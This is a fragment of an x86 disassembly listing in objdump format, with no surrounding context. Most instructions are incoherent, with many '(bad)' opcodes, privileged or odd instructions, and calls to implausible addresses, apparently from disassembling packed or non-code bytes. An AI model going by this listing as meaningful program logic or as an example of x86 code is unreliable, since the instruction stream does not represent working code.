  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
